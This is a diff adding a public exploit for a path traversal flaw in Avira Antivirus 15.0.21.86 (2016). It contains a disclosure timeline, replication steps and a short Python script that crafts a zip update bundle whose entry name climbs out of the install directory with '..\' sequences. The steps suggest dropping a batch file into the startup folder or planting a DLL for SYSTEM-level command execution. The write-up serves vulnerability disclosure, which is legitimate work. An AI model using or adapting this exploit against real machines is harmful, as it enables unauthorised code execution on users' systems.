@@ -1,0 +1,52 @@
+# Title :  Avira Antivirus >= 15.0.21.86 Command Execution (SYSTEM)
+# Date : 08/11/2016
+# Author : R-73eN
+# Tested on: Avira Antivirus 15.0.21.86 in Windows 7
+# Vendor : https://www.avira.com/
+# Disclosure Timeline:
+# 2016-06-28 - Reported to Vendor through Bugcrowd.
+# 2016-06-29 - Vendor Replied.
+# 2016-07-05 - Vendor Replicated the vulnerability.
+# 2016-09-02 - Vendor released updated version which fix the vulnerability.
+# 2016-11-08 - Public Disclosure
+# I would like to thank Avira security team for the quick response. 
+#
+# Vulnerability Description:
+# When the Avira Launcher manual update imports a zip file doesn't checks for " ../ " 
+# characters which makes it possible to do a path traversal and write anywhere in the system.
+# Vulnerability Replication
+# 1. Create a special crafted zip file with the python script attached. 
+# 2. The script will create a zip file named xvdf_fusebundle.zip with a filename test.bat (this can be changed) and will write this file to the root directory C:\ 
+# 3. You can change the directory go to startup and when the user reboots the script will get executed or you can write a malicious dll to a program directory or 
+#    system32 directory which will get loaded and we gain remote command execution. 
+# 4. Open avira free antivirus 
+# 5. Go to update -> Manual Update 
+# 6. Select the malicious file 
+# 7. Directory traversal was sucessfull
+# Youtube Video: https://www.youtube.com/watch?v=IIEgWiDcw2Q
+# POC: 
+
+#!/usr/bin/python -w
+banner = ""
+banner += "  ___        __        ____                 _    _  \n" 
+banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
+banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
+banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
+banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
+print banner
+
+import zipfile, sys
+
+
+if(len(sys.argv) != 2):
+    print "[+] Usage : python exploit.py file_to_do_the_traversal [+]"
+    print "[+] Example: python exploit.py test.txt"
+    exit(0)
+print "[+] Creating Zip File [+]"
+zf = zipfile.ZipFile("xvdf_fusebundle.zip", "w")
+zf.write(sys.argv[1], "..\\..\\..\\..\\..\\..\\..\\..\\test.bat")
+zf.close()
+print "[+] Created xvdf_fusebundle.zip successfully [+]"
+
+# Fix:
+# Update to the latest version.
